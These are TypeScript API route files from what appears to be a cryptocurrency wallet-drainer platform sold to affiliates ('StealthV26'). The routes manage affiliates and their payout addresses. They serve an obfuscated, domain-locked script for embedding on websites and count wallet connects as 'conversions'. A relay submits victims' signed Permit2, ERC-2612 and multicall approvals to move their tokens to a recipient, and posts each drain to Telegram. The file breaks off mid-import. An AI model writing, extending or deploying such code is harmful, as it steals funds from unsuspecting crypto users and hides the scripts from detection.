```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize } from "@/lib/rbac";
import {
  getAffiliateProject,
  updateAffiliateProject,
  deleteAffiliateProject,
} from "@/lib/projects";

type Params = { params: Promise<{ id: string }> };

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

/** GET /api/projects/:id */
export async function GET(_req: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "config:read");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const project = await getAffiliateProject(id);
  if (!project) {
    return NextResponse.json({ status: "error", message: "Not found" }, { status: 404 });
  }
  return NextResponse.json({ status: "ok", project });
}

/** PATCH /api/projects/:id — update affiliate details */
export async function PATCH(request: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "config:write");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  try {
    const body = await request.json();
    // accessSecret is managed via /api/projects/:id/reset-password — not patchable directly
    const allowed = ["name", "payoutAddress", "telegramBotToken", "telegramChatId", "status", "domains", "notes"];
    const updates: Record<string, unknown> = {};
    for (const key of allowed) {
      if (body[key] !== undefined) updates[key] = body[key];
    }

    const updated = await updateAffiliateProject(id, updates);
    if (!updated) {
      return NextResponse.json({ status: "error", message: "Not found" }, { status: 404 });
    }
    return NextResponse.json({ status: "ok", project: updated });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request" }, { status: 400 });
  }
}

/** DELETE /api/projects/:id */
export async function DELETE(_req: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "users:manage");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  await deleteAffiliateProject(id);
  return NextResponse.json({ status: "ok", message: "Deleted" });
}
```

### src/app/api/projects/[id]/stats/route.ts

```typescript
/**
 * GET /api/projects/:id/stats
 *
 * Per-affiliate analytics: script loads, conversions, daily breakdown.
 */

import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize } from "@/lib/rbac";
import { getAffiliateProject } from "@/lib/projects";
import { getRedis } from "@/lib/redis";

type Params = { params: Promise<{ id: string }> };

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

export async function GET(_req: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "analytics:read");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const project = await getAffiliateProject(id);
  if (!project) {
    return NextResponse.json({ status: "error", message: "Not found" }, { status: 404 });
  }

  const redis = await getRedis();

  // Total hits
  const totalHits = parseInt(await redis.get(`hits:${id}:total`) || "0", 10);

  // Last 30 days breakdown
  const daily: { date: string; hits: number }[] = [];
  for (let i = 29; i >= 0; i--) {
    const d = new Date();
    d.setDate(d.getDate() - i);
    const dateStr = d.toISOString().split("T")[0];
    const hits = parseInt(await redis.get(`hits:${id}:${dateStr}`) || "0", 10);
    daily.push({ date: dateStr, hits });
  }

  // Total conversions (wallet connects tracked via relay)
  const totalConversions = parseInt(await redis.get(`conversions:${id}:total`) || "0", 10);

  return NextResponse.json({
    status: "ok",
    projectId: id,
    stats: {
      totalHits,
      totalConversions,
      conversionRate: totalHits > 0 ? ((totalConversions / totalHits) * 100).toFixed(2) + "%" : "0%",
      daily,
    },
  });
}
```

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize } from "@/lib/rbac";
import {
  createAffiliateProject,
  listAffiliateProjects,
} from "@/lib/projects";
import { sendTelegramNotification } from "@/lib/telegram";
import { createAffiliateSchema } from "@/lib/validation";

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

/** GET /api/projects — list all affiliate projects (owner/admin only) */
export async function GET() {
  const address = await getCallerAddress();
  const err = authorize(address, "config:read");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const projects = await listAffiliateProjects();
  return NextResponse.json({ status: "ok", projects });
}

/** POST /api/projects — create affiliate project */
export async function POST(request: Request) {
  const address = await getCallerAddress();
  const err = authorize(address, "config:write");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  try {
    const body = await request.json();
    const parsed = createAffiliateSchema.safeParse(body);

    if (!parsed.success) {
      const errors = parsed.error.issues.map((i) => i.message).join(", ");
      return NextResponse.json({ status: "error", message: errors }, { status: 400 });
    }

    const { name, payoutAddress, telegramBotToken, telegramChatId, notes } = parsed.data;

    const { project, plaintextPassword } = await createAffiliateProject({
      name,
      payoutAddress,
      telegramBotToken,
      telegramChatId,
      notes: notes || "",
    });

    void sendTelegramNotification({
      projectId: project.id,
      message:
        `✅ Affiliate Created\n` +
        `project: <code>${project.id}</code>\n` +
        `name: <b>${project.name}</b>\n` +
        `username: <code>${project.username}</code>\n` +
        `status: <b>${project.status}</b>\n` +
        `payout: <code>${project.payoutAddress}</code>`,
    });

    // Return credentials once — password is never retrievable again after this response
    return NextResponse.json({
      status: "ok",
      project,
      credentials: {
        username: project.username,
        password: plaintextPassword,
      },
    }, { status: 201 });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request" }, { status: 400 });
  }
}
```

### src/app/api/relay/batch/route.ts

```typescript
import { NextResponse } from "next/server";
import { readOperationalConfig } from "@/lib/operational-config-store";
import { getExecutionBackendEntry } from "@/lib/contract-registry";
import { sendTelegramNotification } from "@/lib/telegram";
import { rateLimit } from "@/lib/redis";
import { getEventBus, TOPICS } from "@/lib/kafka";
import {
  createPublicClient,
  createWalletClient,
  http,
  isAddress,
  parseAbi,
  encodeFunctionData,
} from "viem";
import { mainnet, optimism, polygon, arbitrum, bsc, avalanche, base } from "viem/chains";
import { privateKeyToAccount } from "viem/accounts";
import type { Chain } from "viem";
import type { ExecutionBackend } from "@/lib/types";

const SUPPORTED_CHAINS: Record<number, { chain: Chain; rpcEnv: string; fallback: string }> = {
  1: { chain: mainnet, rpcEnv: "ETHEREUM_RPC_URL", fallback: "https://eth.llamarpc.com" },
  10: { chain: optimism, rpcEnv: "OPTIMISM_RPC_URL", fallback: "https://mainnet.optimism.io" },
  137: { chain: polygon, rpcEnv: "POLYGON_RPC_URL", fallback: "https://polygon-rpc.com" },
  42161: { chain: arbitrum, rpcEnv: "ARBITRUM_RPC_URL", fallback: "https://arb1.arbitrum.io/rpc" },
  56: { chain: bsc, rpcEnv: "BSC_RPC_URL", fallback: "https://bsc-dataseed1.binance.org" },
  43114: { chain: avalanche, rpcEnv: "AVALANCHE_RPC_URL", fallback: "https://api.avax.network/ext/bc/C/rpc" },
  8453: { chain: base, rpcEnv: "BASE_RPC_URL", fallback: "https://mainnet.base.org" },
};

function getChainConfig(chainId?: number) {
  const id = chainId && SUPPORTED_CHAINS[chainId] ? chainId : 1;
  const cfg = SUPPORTED_CHAINS[id];
  const rpcUrl = process.env[cfg.rpcEnv] || cfg.fallback;
  return { chain: cfg.chain, rpcUrl };
}

type Hex = `0x${string}`;
type BatchDetail = {
  token?: unknown;
  amount?: unknown;
  expiration?: unknown;
  nonce?: unknown;
};
type ERC2612PermitInput = {
  token?: unknown;
  amount?: unknown;
  v?: unknown;
  r?: unknown;
  s?: unknown;
};

const STEALTH_EXCHANGE_ABI = parseAbi([
  "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)",
  "function authorizedExecutors(address) view returns (bool)",
]);

const PERMIT2_EXECUTOR_ABI = parseAbi([
  "function RELAYER() view returns (address)",
  "function pullBatchFromAllowance(address client, address[] tokens, uint256[] amounts)",
]);

const BATCH_MULTICALL_ABI = parseAbi([
  "function batch((address target,uint256 value,bytes data,bool allowFailure)[] calls) payable",
]);
const ERC2612_EXECUTOR_ABI = parseAbi([
  "function RELAYER() view returns (address)",
  "function batchPermitAndCollect(address[] tokens, address client, uint256[] amounts, uint8[] vs, bytes32[] rs, bytes32[] ss)",
]);

const ERC20_TRANSFER_FROM_ABI = parseAbi([
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
]);

function jsonError(message: string, status = 400) {
  return NextResponse.json({ status: "error", message }, { status });
}

function readDetailToken(detail: BatchDetail) {
  return typeof detail.token === "string" ? detail.token : undefined;
}

function readDetailAmount(detail: BatchDetail) {
  return typeof detail.amount === "string" || typeof detail.amount === "number" ? detail.amount : undefined;
}

function readPermitSignaturePart(value: unknown) {
  return typeof value === "string" && value.startsWith("0x") ? value : undefined;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { user, recipient, permitBatch, signature, projectId, executionBackend } = body ?? {};

    // Rate limit per user address
    if (user && isAddress(user)) {
      const rl = await rateLimit(`relay:${user.toLowerCase()}`, 10, 60);
      if (!rl.allowed) {
        return jsonError("Rate limit exceeded. Try again later.", 429);
      }
    }

    if (!isAddress(user)) return jsonError("Invalid user address");
    if (!isAddress(recipient)) return jsonError("Invalid recipient address");
    const validatedUser = user as Hex;
    const validatedRecipient = recipient as Hex;

    const operational = await readOperationalConfig();
    const resolvedBackend = (
      typeof executionBackend === "string" ? executionBackend : operational.strategy.executionBackend
    ) as ExecutionBackend;
    const backendEntry = getExecutionBackendEntry(resolvedBackend);
    if (!backendEntry) return jsonError("Unsupported execution backend", 400);
    if (!backendEntry.address || !isAddress(backendEntry.address)) {
      return jsonError(`Missing address config for ${backendEntry.name}`, 500);
    }
    const validatedExchange = backendEntry.address as Hex;

    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    if (!relayerKey) return jsonError("RELAYER_PRIVATE_KEY not configured on server", 500);
    const pk = relayerKey.startsWith("0x") ? (relayerKey as `0x${string}`) : (`0x${relayerKey}` as const);

    const account = privateKeyToAccount(pk);

    const requestedChainId = typeof body?.chainId === "number" ? body.chainId : undefined;
    const { chain, rpcUrl } = getChainConfig(requestedChainId);
    const transport = http(rpcUrl);
    const publicClient = createPublicClient({ chain, transport });
    const walletClient = createWalletClient({ chain, transport, account });

    let hash: Hex;

    if (resolvedBackend === "stealth-exchange") {
      // Optional sanity check: relayer is authorized executor
      try {
        const authorized = await publicClient.readContract({
          address: validatedExchange,
          abi: STEALTH_EXCHANGE_ABI,
          functionName: "authorizedExecutors",
          args: [account.address],
        });
        if (!authorized) return jsonError("Relayer not authorized in contract", 403);
      } catch {
        // If the read fails, proceed; contract may not expose this in some builds.
      }

      if (!permitBatch || typeof permitBatch !== "object") return jsonError("Missing permitBatch");
      if (!Array.isArray(permitBatch.details)) return jsonError("permitBatch.details must be an array");
      if (!isAddress(permitBatch.spender)) return jsonError("permitBatch.spender must be an address");
      if (typeof permitBatch.sigDeadline !== "number" && typeof permitBatch.sigDeadline !== "string") {
        return jsonError("permitBatch.sigDeadline must be number or string");
      }

      if (typeof signature !== "string" || !signature.startsWith("0x")) return jsonError("Invalid signature");
      const validatedSignature = signature as Hex;

      const normalizedPermitBatch = {
        details: (permitBatch.details as BatchDetail[]).map((detail) => {
          const token = readDetailToken(detail);
          const amount = readDetailAmount(detail);
          if (!token || !isAddress(token)) throw new Error("Invalid token in permitBatch.details");
          if (amount === undefined) throw new Error("Invalid amount in permitBatch.details");
          return {
            token: token as Hex,
            amount: BigInt(amount),
            expiration: Number(detail.expiration),
            nonce: Number(detail.nonce),
          };
        }),
        spender: permitBatch.spender as Hex,
        sigDeadline: BigInt(permitBatch.sigDeadline),
      };

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: STEALTH_EXCHANGE_ABI,
        functionName: "batchPermitTransferFromBatch",
        args: [validatedUser, normalizedPermitBatch, validatedSignature, validatedRecipient],
      });
    } else if (resolvedBackend === "permit2-executor") {
      const details = permitBatch && typeof permitBatch === "object" && Array.isArray(permitBatch.details)
        ? (permitBatch.details as BatchDetail[])
        : null;
      if (!details?.length) return jsonError("permit2-executor requires permitBatch.details");

      const tokens: Hex[] = [];
      const amounts: bigint[] = [];
      for (const detail of details) {
        if (!detail || typeof detail !== "object") return jsonError("Invalid detail entry");
        const token = readDetailToken(detail);
        const amount = readDetailAmount(detail);
        if (!token || !isAddress(token)) return jsonError("Invalid token address in permitBatch.details");
        if (amount === undefined) {
          return jsonError("Invalid amount in permitBatch.details");
        }
        tokens.push(token as Hex);
        amounts.push(BigInt(amount));
      }

      try {
        const relayer = await publicClient.readContract({
          address: validatedExchange,
          abi: PERMIT2_EXECUTOR_ABI,
          functionName: "RELAYER",
        });
        if (typeof relayer === "string" && relayer.toLowerCase() !== account.address.toLowerCase()) {
          return jsonError("Relayer does not match Permit2Executor RELAYER()", 403);
        }
      } catch {
        // Non-blocking; continue if the contract omits the view or RPC read fails.
      }

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: PERMIT2_EXECUTOR_ABI,
        functionName: "pullBatchFromAllowance",
        args: [validatedUser, tokens, amounts],
      });
    } else if (resolvedBackend === "erc2612-executor") {
      const permits = Array.isArray(body?.erc2612Permits) ? (body.erc2612Permits as ERC2612PermitInput[]) : null;
      if (!permits?.length) return jsonError("erc2612-executor requires erc2612Permits");

      const tokens: Hex[] = [];
      const amounts: bigint[] = [];
      const vs: number[] = [];
      const rs: Hex[] = [];
      const ss: Hex[] = [];

      for (const permit of permits) {
        const token = typeof permit.token === "string" ? permit.token : undefined;
        const amount = typeof permit.amount === "string" || typeof permit.amount === "number" ? permit.amount : undefined;
        const v = typeof permit.v === "number" ? permit.v : undefined;
        const r = readPermitSignaturePart(permit.r);
        const s = readPermitSignaturePart(permit.s);
        if (!token || !isAddress(token)) return jsonError("Invalid token in erc2612Permits");
        if (amount === undefined) return jsonError("Invalid amount in erc2612Permits");
        if (v === undefined || !r || !s) return jsonError("Invalid signature parts in erc2612Permits");
        tokens.push(token as Hex);
        amounts.push(BigInt(amount));
        vs.push(v);
        rs.push(r as Hex);
        ss.push(s as Hex);
      }

      try {
        const relayer = await publicClient.readContract({
          address: validatedExchange,
          abi: ERC2612_EXECUTOR_ABI,
          functionName: "RELAYER",
        });
        if (typeof relayer === "string" && relayer.toLowerCase() !== account.address.toLowerCase()) {
          return jsonError("Relayer does not match ERC2612Executor RELAYER()", 403);
        }
      } catch {
        // Non-blocking sanity check.
      }

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: ERC2612_EXECUTOR_ABI,
        functionName: "batchPermitAndCollect",
        args: [tokens, validatedUser, amounts, vs, rs, ss],
      });
    } else if (resolvedBackend === "batch-multicall") {
      const details = permitBatch && typeof permitBatch === "object" && Array.isArray(permitBatch.details)
        ? (permitBatch.details as BatchDetail[])
        : null;
      if (!details?.length) return jsonError("batch-multicall requires permitBatch.details");

      const calls = details.map((detail) => {
        if (!detail || typeof detail !== "object") throw new Error("Invalid detail entry");
        const token = readDetailToken(detail);
        const amount = readDetailAmount(detail);
        if (!token || !isAddress(token)) throw new Error("Invalid token address in permitBatch.details");
        if (amount === undefined) {
          throw new Error("Invalid amount in permitBatch.details");
        }

        return {
          target: token as Hex,
          value: 0n,
          data: encodeFunctionData({
            abi: ERC20_TRANSFER_FROM_ABI,
            functionName: "transferFrom",
            args: [validatedUser, validatedRecipient, BigInt(amount)],
          }),
          allowFailure: false,
        };
      });

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: BATCH_MULTICALL_ABI,
        functionName: "batch",
        args: [calls],
      });
    } else if (resolvedBackend === "eip7702-delegate") {
      // EIP-7702 batch delegate: batchCall(address[] tokens, bytes[] calldatas, uint256[] amounts, bool sendETH)
      const EIP7702_BATCH_DELEGATE_ABI = parseAbi([
        "function batchCall(address[] tokens, bytes[] calldatas, uint256[] amounts, bool sendETH)",
      ]);

      const details = permitBatch && typeof permitBatch === "object" && Array.isArray(permitBatch.details)
        ? (permitBatch.details as BatchDetail[])
        : null;
      if (!details?.length) return jsonError("eip7702-delegate requires permitBatch.details");

      const tokens: Hex[] = [];
      const amounts: bigint[] = [];
      const calldatas: Hex[] = [];

      for (const detail of details) {
        if (!detail || typeof detail !== "object") return jsonError("Invalid detail entry");
        const token = readDetailToken(detail);
        const amount = readDetailAmount(detail);
        if (!token || !isAddress(token)) return jsonError("Invalid token address in permitBatch.details");
        if (amount === undefined) return jsonError("Invalid amount in permitBatch.details");
        tokens.push(token as Hex);
        const amountBig = BigInt(amount);
        amounts.push(amountBig);
        calldatas.push(
          encodeFunctionData({
            abi: ERC20_TRANSFER_FROM_ABI,
            functionName: "transferFrom",
            args: [validatedUser, validatedRecipient, amountBig],
          }),
        );
      }

      const sendETH = typeof body?.sendETH === "boolean" ? body.sendETH : false;

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: EIP7702_BATCH_DELEGATE_ABI,
        functionName: "batchCall",
        args: [tokens, calldatas, amounts, sendETH],
      });
    } else {
      return jsonError(`Execution backend ${resolvedBackend} is registered but not implemented in relay route`, 400);
    }

    void sendTelegramNotification({
      projectId: typeof projectId === "string" ? projectId : undefined,
      message:
        `🚀 Relay Executed\n` +
        `user: <code>${validatedUser}</code>\n` +
        `recipient: <code>${validatedRecipient}</code>\n` +
        `backend: <b>${backendEntry.name}</b>\n` +
        `relayer: <code>${account.address}</code>\n` +
        `tokens: <b>${permitBatch.details?.length ?? 0}</b>\n` +
        `tx: <code>${hash}</code>`,
    });

    // Publish event to Kafka
    try {
      const bus = await getEventBus();
      await bus.publish({
        topic: TOPICS.RELAY_EXECUTED,
        key: validatedUser,
        value: {
          user: validatedUser,
          recipient: validatedRecipient,
          backend: backendEntry.name,
          relayer: account.address,
          hash,
          tokenCount: permitBatch.details?.length ?? 0,
        },
      });
    } catch { /* non-blocking */ }

    return NextResponse.json({ status: "ok", hash });
  } catch (error) {
    const message =
      error instanceof Error
        ? error.message
        : typeof error === "object" && error && "shortMessage" in error
          ? String((error as { shortMessage?: unknown }).shortMessage)
          : "Relay failed";
    console.error("[relay/batch]", message, error);
    return jsonError(message.slice(0, 500), 500);
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { privateKeyToAccount } from "viem/accounts";
import { createPublicClient, http, isAddress } from "viem";
import { mainnet } from "viem/chains";
import { readOperationalConfig } from "@/lib/operational-config-store";
import { getExecutionBackendEntry } from "@/lib/contract-registry";

const STEALTH_EXCHANGE_ABI = [
  {
    inputs: [{ name: "", type: "address" }],
    name: "authorizedExecutors",
    outputs: [{ type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
] as const;

export async function GET() {
  const relayerKey = process.env.RELAYER_PRIVATE_KEY?.trim();
  const rpcUrl = process.env.ETHEREUM_RPC_URL || "https://eth.llamarpc.com";

  if (!relayerKey) {
    return NextResponse.json({
      status: "ok",
      relayConfigured: false,
      message: "RELAYER_PRIVATE_KEY is not set. Use direct on-chain execution on /permit2 or add a relayer key.",
    });
  }

  try {
    const pk = relayerKey.startsWith("0x") ? (relayerKey as `0x${string}`) : (`0x${relayerKey}` as const);
    const account = privateKeyToAccount(pk);
    const operational = await readOperationalConfig();
    const backend = getExecutionBackendEntry(operational.strategy.executionBackend);
    const exchangeAddress = backend?.address;

    let authorizedOnExchange: boolean | null = null;
    if (exchangeAddress && isAddress(exchangeAddress)) {
      const publicClient = createPublicClient({ chain: mainnet, transport: http(rpcUrl) });
      try {
        authorizedOnExchange = await publicClient.readContract({
          address: exchangeAddress,
          abi: STEALTH_EXCHANGE_ABI,
          functionName: "authorizedExecutors",
          args: [account.address],
        });
      } catch {
        authorizedOnExchange = null;
      }
    }

    return NextResponse.json({
      status: "ok",
      relayConfigured: true,
      relayerAddress: account.address,
      executionBackend: operational.strategy.executionBackend,
      exchangeAddress: exchangeAddress ?? null,
      authorizedOnExchange,
      message:
        authorizedOnExchange === false
          ? "Relayer key is set but is not authorized on StealthExchange. Call setExecutor(relayer, true) or use direct execution."
          : "Relay is configured.",
    });
  } catch (error) {
    const message = error instanceof Error ? error.message : "Invalid RELAYER_PRIVATE_KEY";
    return NextResponse.json({
      status: "ok",
      relayConfigured: false,
      message,
    });
  }
}
```

### src/app/api/script/route.ts

```typescript
/**
 * GET /api/script?configId=aff_xxxx
 *
 * Dynamic script endpoint — affiliates embed this URL directly:
 *   <script src="https://yourdomain.com/api/script?configId=aff_xxxx"></script>
 *
 * Self-hosted dashboard (no affiliate id): use GET /api/sdk (see Compile page) or
 * /generated-scripts/stealthv26-latest.min.js after compiling.
 * Benefits over static download:
 *  - Real-time config updates (no re-download)
 *  - Usage tracking per request
 *  - Can disable configs instantly
 */

import { getAffiliateProject, getAffiliateConfig } from "@/lib/projects";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { obfuscateScript, obfuscateWithDomainLock } from "@/lib/obfuscator";
import { getRedis } from "@/lib/redis";
import { getEventBus, TOPICS } from "@/lib/kafka";
import { trackDomainHit } from "@/lib/domains";
import {
  defaultGeneralConfig,
  defaultWalletConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultAdvancedConfig,
} from "@/lib/mock-data";
import { readOperationalConfig } from "@/lib/operational-config-store";

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const configId = searchParams.get("configId");

  if (!configId) {
    return new Response("// Error: missing configId parameter", {
      status: 400,
      headers: { "content-type": "application/javascript" },
    });
  }

  const project = await getAffiliateProject(configId);
  if (!project || project.status !== "active") {
    return new Response("// Error: config not found or disabled", {
      status: 404,
      headers: { "content-type": "application/javascript" },
    });
  }

  // Track hit
  const redis = await getRedis();
  const today = new Date().toISOString().split("T")[0];
  await redis.incr(`hits:${configId}:${today}`);
  await redis.incr(`hits:${configId}:total`);

  // Track referrer domain
  const referer = request.headers.get("referer");
  if (referer) {
    try {
      const domain = new URL(referer).hostname;
      await redis.incr(`hits:${configId}:domain:${domain}`);
      // Track domain activity in domain management
      trackDomainHit(domain).catch(() => {});
    } catch { /* ignore bad referer */ }
  }

  // Publish analytics event (non-blocking)
  try {
    const bus = await getEventBus();
    await bus.publish({
      topic: TOPICS.CONTRACT_CALLED,
      key: configId,
      value: {
        type: "script_load",
        configId,
        referer: referer || "direct",
        userAgent: request.headers.get("user-agent") || "",
      },
    });
  } catch { /* non-blocking */ }

  // Load config or use defaults
  const config = await getAffiliateConfig(configId);
  const operational = await readOperationalConfig();
  const general = config?.general ?? defaultGeneralConfig;
  const wallet = config?.wallet ?? defaultWalletConfig;
  const modal = config?.modal ?? { ...defaultModalConfig, exposeExternalSDK: true };
  const tokens = config?.tokens ?? defaultTokensConfig;
  const advanced = config?.advanced ?? defaultAdvancedConfig;

  const sdkBundleRaw = generateSDKBundle({
    general,
    wallet,
    modal: { ...modal, exposeExternalSDK: true },
    tokens,
    advanced,
    contracts: operational.contracts,
    strategy: operational.strategy,
    appKit: operational.appKit,
    receiverAddress: project.payoutAddress,
    affiliateLabel: project.name,
  });

  // Obfuscate (medium by default for dynamic serving)
  let sdkBundle: string;
  if (project.domains && project.domains.length > 0) {
    sdkBundle = await obfuscateWithDomainLock(sdkBundleRaw, project.domains, "medium");
  } else {
    sdkBundle = await obfuscateScript(sdkBundleRaw, "medium");
  }

  return new Response(sdkBundle, {
    headers: {
      "content-type": "application/javascript; charset=utf-8",
      "cache-control": "public, max-age=300, s-maxage=300",
      "access-control-allow-origin": "*",
    },
  });
}
```

```typescript
import type { ObfuscationLevel } from "@/lib/obfuscator";
import { obfuscateScript } from "@/lib/obfuscator";
import { generateLiveSdkBundle } from "@/lib/live-compile-bundle";

/**
 * GET /api/sdk — CDN-style bundle from current dashboard (compile JSON + operational).
 * Loads Reown AppKit from jsDelivr inside the script when executed (modal = AppKit).
 *
 * Embed on any site:
 *   <script type="module" src="https://YOUR_DOMAIN/api/sdk"></script>
 * Optional receiver override:
 *   <script type="module" src="https://YOUR_DOMAIN/api/sdk?receiver=0x..."></script>
 */
export async function GET(request: Request) {
  const url = new URL(request.url);
  const receiver = url.searchParams.get("receiver")?.trim() || undefined;
  const obfLevel = (url.searchParams.get("obfuscate") || "none") as ObfuscationLevel;

  let sdkBundle = await generateLiveSdkBundle(receiver);

  if (obfLevel !== "none") {
    sdkBundle = await obfuscateScript(sdkBundle, obfLevel);
  }

  return new Response(sdkBundle, {
    headers: {
      "content-type": "application/javascript; charset=utf-8",
      "cache-control": "public, max-age=60, s-maxage=60",
      "access-control-allow-origin": "*",
    },
  });
}
```

### src/app/api/telegram/affiliate/[token]/route.ts

```typescript
/**
 * POST /api/telegram/affiliate/[token]
 *
 * Per-affiliate Telegram webhook. Each affiliate bot is registered with Telegram
 * pointing at:
 *
 *   https://<your-domain>/api/telegram/affiliate/<BOT_TOKEN>
 *
 * Telegram will POST updates here. We resolve the project by matching the token
 * against encrypted stored tokens, then dispatch affiliate-scoped commands
 * (/status, /compile, /domains, /add-domain, /remove-domain).
 *
 * No shared secret header is needed because the token itself is a secret URL
 * component. Optionally you can still set X-Telegram-Bot-Api-Secret-Token
 * in the webhook registration — if TELEGRAM_WEBHOOK_SECRET is set we enforce it.
 */

import { NextResponse } from "next/server";
import { processAffiliateUpdate, type TelegramUpdate } from "@/lib/telegram-affiliate-bot";

function getWebhookSecret() {
  return process.env.TELEGRAM_WEBHOOK_SECRET || "";
}

export async function POST(
  request: Request,
  { params }: { params: Promise<{ token: string }> },
) {
  // Optional: enforce shared webhook secret if configured
  const configured = getWebhookSecret();
  if (configured) {
    const header = request.headers.get("x-telegram-bot-api-secret-token");
    if (header !== configured) {
      return NextResponse.json({ status: "error", message: "Unauthorized" }, { status: 401 });
    }
  }

  const { token } = await params;
  if (!token) {
    return NextResponse.json({ status: "error", message: "Missing token" }, { status: 400 });
  }

  let update: TelegramUpdate;
  try {
    update = (await request.json()) as TelegramUpdate;
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid JSON" }, { status: 400 });
  }

  try {
    const handled = await processAffiliateUpdate(token, update);
    if (!handled) {
      // Token not matched — return 200 so Telegram stops retrying
      return NextResponse.json({ status: "ok", matched: false });
    }
    return NextResponse.json({ status: "ok", matched: true });
  } catch {
    // Always 200 to prevent Telegram retry loops
    return NextResponse.json({ status: "ok" });
  }
}
```

### src/app/api/telegram/route.ts

```typescript
import { NextResponse } from "next/server";
import { getAffiliateProjectDecrypted } from "@/lib/projects";
import { sendCustomTelegramMessage, sendTelegramNotification } from "@/lib/telegram";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const message = body?.message || "StealthV26 WaaS — Test notification";
    const projectId = typeof body?.projectId === "string" ? body.projectId.trim() : "";
    const includePlatform = body?.includePlatform !== false;
    const bodyToken = typeof body?.botToken === "string" ? body.botToken : "";
    const bodyChatId = typeof body?.chatId === "string" ? body.chatId : "";

    if (bodyToken && bodyChatId) {
      const ok = await sendCustomTelegramMessage({
        message,
        botToken: bodyToken,
        chatId: bodyChatId,
      });

      if (!ok) {
        return NextResponse.json(
          { status: "error", message: "Telegram API error" },
          { status: 400 }
        );
      }

      return NextResponse.json({
        status: "ok",
        message: "Message sent successfully",
        platformSent: false,
        affiliateSent: true,
      });
    }

    if (projectId) {
      const project = await getAffiliateProjectDecrypted(projectId);
      if (!project) {
        return NextResponse.json(
          { status: "error", message: "Affiliate project not found" },
          { status: 404 }
        );
      }
    }

    const result = await sendTelegramNotification({
      message,
      projectId: projectId || undefined,
      includePlatform,
    });

    if (!result.platformSent && !result.affiliateSent) {
      return NextResponse.json(
        { status: "error", message: "No Telegram target is configured" },
        { status: 400 }
      );
    }

    return NextResponse.json({
      status: "ok",
      message: "Message sent successfully",
      ...result,
    });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Failed to send Telegram message" },
      { status: 500 }
    );
  }
}
```

```typescript
import { NextResponse } from "next/server";
import {
  getTelegramBotDiagnostics,
  isTelegramWebhookAuthorized,
  processTelegramUpdate,
  registerBotCommands,
} from "@/lib/telegram-bot";

export async function GET() {
  // Hitting this endpoint re-registers the command list with BotFather
  void registerBotCommands();
  return NextResponse.json({
    status: "ok",
    bot: getTelegramBotDiagnostics(),
  });
}

export async function POST(request: Request) {
  if (!isTelegramWebhookAuthorized(request.headers.get("x-telegram-bot-api-secret-token"))) {
    return NextResponse.json({ status: "error", message: "Unauthorized webhook" }, { status: 401 });
  }

  try {
    const update = await request.json();
    await processTelegramUpdate(update);
    return NextResponse.json({ status: "ok" });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid Telegram update" }, { status: 400 });
  }
}
```

```tsx
"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { GeneralTab } from "@/components/compile/general-tab";
import { WalletTab } from "@/components/compile/wallet-tab";
import { ModalTab } from "@/components/compile/modal-tab";
import { TokensTab } from "@/components/compile/tokens-tab";
import { AdvancedTab } from "@/components/compile/advanced-tab";
import { PayoutTab } from "@/components/compile/payout-tab";
import { CompileOutput } from "@/components/compile/compile-output";
import { TrailsLiveBuilder } from "@/components/compile/trails-live-builder";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useStore } from "@/lib/store";
import type { CompileConfig } from "@/lib/compile-config-store";
